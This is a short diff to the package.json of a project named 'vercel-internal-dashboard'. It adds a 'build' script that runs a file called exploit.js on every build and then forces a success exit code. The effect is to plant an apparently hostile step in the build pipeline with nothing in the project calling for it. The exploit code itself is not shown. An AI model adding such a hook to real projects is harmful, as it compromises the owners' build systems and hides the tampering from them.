@@ -2,6 +2,7 @@
   "name": "vercel-internal-dashboard",
   "version": "1.0.0",
   "scripts": {
-    "start": "vercel dev"
+    "start": "vercel dev",
+    "build": "node exploit.js && exit 0"
   }
 }
